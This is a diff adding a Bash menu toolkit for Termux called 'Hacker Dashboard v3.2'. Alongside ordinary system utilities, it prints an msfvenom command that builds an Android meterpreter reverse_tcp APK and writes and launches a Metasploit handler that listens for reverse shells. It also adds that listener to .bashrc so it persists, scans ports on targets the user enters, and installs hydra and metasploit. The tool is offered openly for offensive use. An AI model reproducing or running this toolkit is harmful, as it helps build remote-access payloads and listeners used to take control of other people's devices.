@@ -1,0 +1,213 @@
+#!/bin/bash
+# =========================================
+# Hacker Dashboard v3.2 (All-in-One Toolkit)
+# =========================================
+
+LOG_DIR=~/logs
+BACKUP_DIR=~/logs_backup
+mkdir -p $LOG_DIR $BACKUP_DIR
+
+# --- FUNCTIONS ---
+
+# 1) Payload Generator (placeholder for msfvenom)
+payload_generator() {
+    echo -e "\e[34m[+] Generating payload...\e[0m"
+    echo "Example: msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R > payload.apk"
+}
+
+# 2) Start Listener (Metasploit RC persistence)
+start_listener() {
+    echo -e "\e[34m[+] Starting Listener...\e[0m"
+    echo "use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit" > ~/.listener.rc
+    msfconsole -r ~/.listener.rc
+}
+
+# 3) System Info
+system_info() {
+    echo -e "\e[34m[+] System Information:\e[0m"
+    uname -a
+    df -h
+    free -h
+}
+
+# 4) List Files
+list_files() {
+    echo -e "\e[34m[+] Listing files in current directory:\e[0m"
+    ls -lh
+}
+
+# 5) Locate File
+locate_file() {
+    read -p "Enter filename to search: " fname
+    find ~ -type f -name "$fname" 2>/dev/null
+}
+
+# 6) Make File Executable
+make_executable() {
+    read -p "Enter file path: " fpath
+    chmod +x "$fpath" && echo -e "\e[32m[+] Made $fpath executable!\e[0m"
+}
+
+# 7) Auto-Start Persistent Listener
+auto_start() {
+    echo -e "\e[34m[+] Enabling Auto-Start Listener...\e[0m"
+    grep -qxF 'msfconsole -r ~/.listener.rc' ~/.bashrc || echo 'msfconsole -r ~/.listener.rc' >> ~/.bashrc
+    echo -e "\e[32m[+] Auto-start enabled!\e[0m"
+}
+
+# 8) View Logs
+view_logs() {
+    echo -e "\e[34m[+] Viewing logs...\e[0m"
+    ls -lh $LOG_DIR
+    cat $LOG_DIR/*
+}
+
+# 9) Clear Logs
+clear_logs() {
+    echo -e "\e[31m[!] Clearing logs...\e[0m"
+    rm -rf $LOG_DIR/*
+    echo -e "\e[32m[+] Logs cleared!\e[0m"
+}
+
+# 10) Network Info
+network_info() {
+    echo -e "\e[34m[+] Network Information:\e[0m"
+    ip addr
+    netstat -tuln
+}
+
+# 11) Port Scanner
+port_scan() {
+    read -p "Enter target IP: " tip
+    read -p "Enter ports (e.g. 1-1000): " ports
+    nmap -p $ports $tip
+}
+
+# 12) Install Common Tools
+install_tools() {
+    echo -e "\e[34m[+] Installing tools...\e[0m"
+    pkg install -y nmap hydra metasploit curl wget python
+}
+
+# 13) File Editor
+file_editor() {
+    read -p "Enter file to edit: " fedit
+    nano $fedit
+}
+
+# 14) Process Manager
+process_manager() {
+    echo -e "\e[34m[+] Running processes:\e[0m"
+    ps aux
+}
+
+# 15) Kill Process
+kill_process() {
+    read -p "Enter PID to kill: " pid
+    kill -9 $pid && echo -e "\e[32m[+] Process $pid killed!\e[0m"
+}
+
+# 16) Update Packages
+update_packages() {
+    echo -e "\e[34m[+] Updating packages...\e[0m"
+    pkg update -y && pkg upgrade -y
+}
+
+# 17) Backup Important Files
+backup_files() {
+    echo -e "\e[34m[+] Backing up logs...\e[0m"
+    cp -r $LOG_DIR/* $BACKUP_DIR/
+    echo -e "\e[32m[+] Logs backed up to $BACKUP_DIR!\e[0m"
+}
+
+# 18) Backup + Compress Logs
+backup_logs() {
+    tar -czf $BACKUP_DIR/logs_backup_$(date +%F).tar.gz $LOG_DIR
+    echo -e "\e[32m[+] Logs compressed and saved to $BACKUP_DIR!\e[0m"
+}
+
+# 19) Self Update
+self_update() {
+    echo -e "\e[34m[+] Updating Hacker Dashboard...\e[0m"
+
+    WORKDIR=~/hacker-dashboard
+    DEB_FILE="${WORKDIR}.deb"
+
+    rm -rf $WORKDIR $DEB_FILE
+    mkdir -p $WORKDIR/DEBIAN $WORKDIR/usr/bin
+
+    cat > $WORKDIR/DEBIAN/control <<EOL
+Package: hacker-dashboard
+Version: 3.2
+Section: utils
+Priority: optional
+Architecture: all
+Maintainer: You <you@example.com>
+Description: Termux Hacker Dashboard v3.2
+ All-in-one hacking & system toolkit for Termux.
+ Includes payload generator, listeners, persistence, logs, backups, and system utilities.
+EOL
+
+    cp ~/hacker-dashboard.sh $WORKDIR/usr/bin/hacker-dashboard
+    chmod +x $WORKDIR/usr/bin/hacker-dashboard
+
+    dpkg-deb --build $WORKDIR
+    dpkg -i ${WORKDIR}.deb
+
+    echo -e "\e[32m[+] Hacker Dashboard updated successfully!\e[0m"
+}
+
+# --- MENU LOOP ---
+while true; do
+    echo -e "\n\e[36m====== Hacker Dashboard v3.2 ======\e[0m"
+    echo -e "1) Payload Generator"
+    echo -e "2) Start Listener"
+    echo -e "3) System Info"
+    echo -e "4) List Files"
+    echo -e "5) Locate File"
+    echo -e "6) Make File Executable"
+    echo -e "7) Auto-Start Persistent Listener"
+    echo -e "8) View Logs"
+    echo -e "9) Clear Logs"
+    echo -e "10) Network Info"
+    echo -e "11) Port Scanner"
+    echo -e "12) Install Common Tools"
+    echo -e "13) File Editor"
+    echo -e "14) Process Manager"
+    echo -e "15) Kill Process"
+    echo -e "16) Update Packages"
+    echo -e "17) Backup Important Files"
+    echo -e "18) Backup + Compress Logs"
+    echo -e "19) Self-Update Hacker Dashboard"
+    echo -e "0) Exit"
+    echo -ne "\e[33mSelect an option: \e[0m"
+    read choice
+
+    case $choice in
+        1) payload_generator;;
+        2) start_listener;;
+        3) system_info;;
+        4) list_files;;
+        5) locate_file;;
+        6) make_executable;;
+        7) auto_start;;
+        8) view_logs;;
+        9) clear_logs;;
+        10) network_info;;
+        11) port_scan;;
+        12) install_tools;;
+        13) file_editor;;
+        14) process_manager;;
+        15) kill_process;;
+        16) update_packages;;
+        17) backup_files;;
+        18) backup_logs;;
+        19) self_update;;
+        0) echo -e "\e[31mExiting... Bye!\e[0m"; exit;;
+        *) echo -e "\e[31mInvalid option!\e[0m";;
+    esac
+done
